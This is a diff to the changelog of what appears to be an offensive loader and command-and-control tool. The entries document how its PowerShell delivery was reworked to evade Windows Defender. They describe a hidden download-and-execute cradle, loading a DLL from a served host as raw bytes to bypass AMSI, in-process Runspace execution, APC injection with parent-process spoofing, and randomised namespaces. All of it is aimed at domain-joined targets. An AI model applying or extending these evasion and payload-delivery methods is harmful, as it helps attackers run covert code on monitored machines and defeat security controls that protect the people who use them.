@@ -5,16 +5,16 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
-## [2026-06-07e] feat(evasion): Bootstrap option [3] — DLL AMSI patch + in-process Runspace for CMD delivery
+## [2026-06-07e] feat(evasion): Bootstrap CMD delivery — DLL AMSI patch + in-process Runspace replaces scriptblock cradle
 
-**Problem:** Option [2] Serve (`powershell -nop -ep bypass -w hidden -c "&([scriptblock]::Create(...))"`)
+**Problem:** Option [2] iwr+scriptblock cradle (`powershell -nop -ep bypass -w hidden -c "&([scriptblock]::Create(...))"`)
 is killed by Windows Defender RT behavioral detection on domain-joined targets. Defender flags the
 combination: hidden PS process + HTTP download + scriptblock execute + named pipe C2 loop.
 Confirmed on test target: code is correct (works on unmonitored machine), issue is Defender RT.
 
-**Fix — Option [3] Bootstrap:**
-A new delivery option that avoids all static AMSI signatures in the command line and changes the
-execution path away from the signatured `scriptblock::Create` + `iex` + `downloadstring` patterns:
+**Fix — Bootstrap as option [2] CMD:**
+Option [2] is now the Bootstrap cradle, which avoids all static AMSI signatures and changes the
+execution path away from the `scriptblock::Create` + `iex` + `downloadstring` patterns:
 
 1. `[Reflection.Assembly]::Load(DownloadData('<dll>'))` — loads AmnesiacLoader DLL as raw bytes;
    AMSI never scans binary bytes, only script strings. No static signature.
@@ -30,6 +30,8 @@ execution path away from the signatured `scriptblock::Create` + `iex` + `downloa
 No `-w hidden`, no `-nop` — only `-ep bypass`. The PS process is visible (no hidden window flag),
 reducing Defender's "hidden PS + download + C2" behavioral rule trigger.
 
+Falls back to the old iwr+scriptblock cradle if AmnesiacLoader blob is not embedded.
+
 **C# fixes (AmnesiacLoader):**
 - `SpawnUnmanagedPS` was broken: passed UTF-8 string bytes as shellcode to APC injection, causing
   immediate crash in target process. Fixed to use new `Injector.SpawnWithPPID()`.
@@ -38,9 +40,10 @@ reducing Defender's "hidden PS + download + C2" behavioral rule trigger.
   suspension or APC injection. Used by `SpawnUnmanagedPS` for the Migrate PS path.
 - DLL rebuilt with new randomized namespace (`SbP3ARMRrN`) and name map.
 
-**UI change:** Stealth payload blocks now show [3] Bootstrap only when AmnesiacLoader blob is
-embedded (Build.ps1 has been run). Option prompt dynamically becomes `[1]/[2]/[3]` vs `[1]/[2]`.
-Selecting [3] also writes the DLL to the serve root so it's immediately available via serve.
+**UI change:** Stealth payload blocks now show exactly 2 options:
+- `[1] PowerShell` — inline PS cradle, paste into existing PS session
+- `[2] CMD` — Bootstrap cradle (or iwr+scriptblock fallback if DLL not embedded), run from CMD
+Selecting [2] also writes the DLL to the serve root so it's immediately available via serve.
 
 ## [2026-06-07d] fix(ux): serve check, port change, and LoadWithPartialName removal
 
